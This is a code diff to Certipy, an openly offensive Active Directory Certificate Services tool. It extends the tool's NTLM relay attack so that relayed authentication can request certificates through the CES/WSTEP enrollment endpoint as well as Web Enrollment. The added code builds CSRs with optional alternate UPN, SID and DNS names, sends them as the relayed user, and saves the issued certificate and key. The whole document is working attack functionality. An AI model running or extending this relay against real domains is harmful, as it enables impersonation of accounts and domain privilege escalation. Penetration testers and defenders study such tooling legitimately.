@@ -49,6 +49,7 @@ from certipy.lib.certificate import (
     csr_to_pem,
     der_to_cert,
 )
+from certipy.lib.ces import CESResponseError, build_ces_request, parse_ces_response
 from certipy.lib.constants import OID_TO_STR_NAME_MAP, USER_AGENT
 from certipy.lib.errors import handle_error
 from certipy.lib.logger import logging
@@ -67,9 +68,9 @@ from certipy.lib.target import DnsResolver, Target
 
 class ADCSHTTPRelayServer(HTTPRelayClient):
     """
-    HTTP relay client for AD CS Web Enrollment interface.
+    HTTP relay client for AD CS Web Enrollment and CES/WSTEP interfaces.
 
-    This class relays NTLM authentication to AD CS Web Enrollment services,
+    This class relays NTLM authentication to AD CS HTTP services,
     allowing an attacker to request certificates on behalf of the relayed user.
     """
 
@@ -113,6 +114,8 @@ class ADCSHTTPRelayServer(HTTPRelayClient):
             self.path = "/"
         else:
             self.path = self.target.path
+        if self.adcs_relay.ces and self.target.query:
+            self.path += f"?{self.target.query}"
 
         logging.debug(f"Using path: {self.target.path}")
         logging.debug(f"Using path: {self.path}")
@@ -397,7 +400,7 @@ class ADCSHTTPAttackClient(ProtocolAttack):
     """
     Attack client for HTTP-based AD CS certificate requests.
 
-    This class handles certificate operations via the Web Enrollment interface.
+    This class handles certificate operations via Web Enrollment or CES/WSTEP.
     """
 
     def __init__(self, adcs_relay: "Relay", *args, **kwargs):  # type: ignore
@@ -450,6 +453,8 @@ class ADCSHTTPAttackClient(ProtocolAttack):
         request_id = self.adcs_relay.request_id
         if request_id:
             self._retrieve_certificate(request_id)
+        elif self.adcs_relay.ces:
+            self._request_ces_certificate()
         else:
             self._request_certificate()
 
@@ -592,6 +597,83 @@ class ADCSHTTPAttackClient(ProtocolAttack):
                 self.adcs_relay.pfx_password,
             )
 
+        return self.finish_run()
+
+    def _request_ces_certificate(self) -> None:
+        """Request a certificate from a CES endpoint using WSTEP."""
+        if not self.username and not self.adcs_relay.subject:
+            logging.error(
+                "Relayed NTLM authentication returned an empty username "
+                f"(authenticated as {self.client.user!r}). "
+                "Cannot generate CSR without a valid subject. "
+                "Use '-subject CN=<target>' to specify an explicit subject DN."
+            )
+            return self.finish_run()
+
+        template = self.config.template
+        if template is None:
+            template = "Machine" if self.username.endswith("$") else "User"
+
+        csr, key = create_csr(
+            self.username,
+            alt_dns=self.adcs_relay.alt_dns,
+            alt_upn=self.adcs_relay.alt_upn,
+            alt_sid=self.adcs_relay.alt_sid,
+            subject=self.adcs_relay.subject,
+            key_size=self.adcs_relay.key_size,
+            application_policies=self.adcs_relay.application_policies,
+            smime=self.adcs_relay.smime,
+        )
+        request = build_ces_request(
+            self.adcs_relay.target,
+            csr_to_der(csr),
+            template,
+        )
+
+        session_read_timeout = getattr(self.client.timeout, "read", 10) or 10
+        request_timeout = max(session_read_timeout, 60)
+        logging.info(
+            f"Requesting certificate for {self.client.user!r} "
+            f"based on the template {template!r} via CES"
+        )
+
+        try:
+            response = self.client.post(
+                self.adcs_relay.ces_path,
+                content=request,
+                headers={"Content-Type": "application/soap+xml; charset=utf-8"},
+                timeout=request_timeout,
+            )
+            certificate = parse_ces_response(response.content)
+            if response.status_code >= 400:
+                logging.error(
+                    f"CES returned HTTP {response.status_code} despite including "
+                    "a certificate"
+                )
+                return self.finish_run()
+        except CESResponseError as e:
+            logging.error(f"Failed to request certificate via CES: {e}")
+            return self.finish_run()
+        except httpx.ReadTimeout:
+            logging.error(
+                f"CES request timed out after {request_timeout}s waiting for AD CS"
+            )
+            return self.finish_run()
+        except Exception as e:
+            logging.error(f"Error during CES certificate request: {e}")
+            handle_error()
+            return self.finish_run()
+
+        logging.info("Successfully requested certificate via CES")
+        handle_request_response(
+            certificate,
+            key,
+            self.client.user,
+            self.adcs_relay.subject,
+            self.adcs_relay.alt_sid,
+            self.adcs_relay.out,
+            self.adcs_relay.pfx_password,
+        )
         return self.finish_run()
 
     def finish_run(self) -> None:
@@ -840,6 +922,7 @@ class Relay:
         no_skip: bool = False,
         timeout: int = 5,
         enum_templates: bool = False,
+        ces: bool = False,
         **kwargs,  # type: ignore
     ):
         """
@@ -866,10 +949,12 @@ class Relay:
             no_skip: Don't skip already attacked targets
             timeout: Connection timeout in seconds
             enum_templates: Enumerate available templates instead of requesting certificate
+            ces: Use Certificate Enrollment Services (CES/WSTEP)
             kwargs: Additional arguments
         """
         self.target = target
         self.base_url = target  # Used only for HTTP(S) targets
+        self.ces_path = "/"
         self.ca = ca
         self.template = template
         self.alt_upn = upn
@@ -887,6 +972,7 @@ class Relay:
         self.interface = interface
         self.port = port
         self.enum_templates = enum_templates
+        self.ces = ces
         self.kwargs = kwargs
         self.key: Optional[rsa.RSAPrivateKey] = None
 
@@ -902,6 +988,15 @@ class Relay:
         self.attacked_targets = []
         self.attack_lock = Lock()
 
+        if self.ces and self.target.startswith("rpc://"):
+            raise ValueError("CES requires an HTTP or HTTPS target")
+        if self.ces and self.enum_templates:
+            raise ValueError("Template enumeration is not supported with CES")
+        if self.ces and self.request_id:
+            raise ValueError("Certificate retrieval is not supported with CES")
+        if self.ces and self.archive_key:
+            raise ValueError("Key archival is not supported with CES")
+
         # Configure target based on URL or RPC string
         if self.target.startswith("rpc://"):
             if ca is None:
@@ -915,15 +1010,18 @@ class Relay:
                 "https://"
             ):
                 self.target = f"http://{self.target}"
-            if not self.target.endswith("/certsrv/certfnsh.asp"):
-                if not self.target.endswith("/"):
-                    self.target += "/"
+            if self.ces:
+                logging.info(f"Targeting {self.target} (CES/WSTEP)")
+            else:
+                if not self.target.endswith("/certsrv/certfnsh.asp"):
+                    if not self.target.endswith("/"):
+                        self.target += "/"
 
-                if self.enum_templates:
-                    self.target += "certsrv/certrqxt.asp"
-                else:
-                    self.target += "certsrv/certfnsh.asp"
-            logging.info(f"Targeting {self.target} (ESC8)")
+                    if self.enum_templates:
+                        self.target += "certsrv/certrqxt.asp"
+                    else:
+                        self.target += "certsrv/certfnsh.asp"
+                logging.info(f"Targeting {self.target} (ESC8)")
 
             url = httpx.URL(self.target)
 
@@ -933,7 +1031,14 @@ class Relay:
                 )
                 exit(1)
 
-            self.base_url = f"{url.scheme}://{url.host}"
+            if self.ces:
+                self.target = str(url)
+                self.ces_path = url.raw_path.decode()
+                self.base_url = str(
+                    url.copy_with(path="/", query=None, fragment=None)
+                ).rstrip("/")
+            else:
+                self.base_url = f"{url.scheme}://{url.host}"
 
         # Configure impacket relay target
         target_processor = TargetsProcessor(
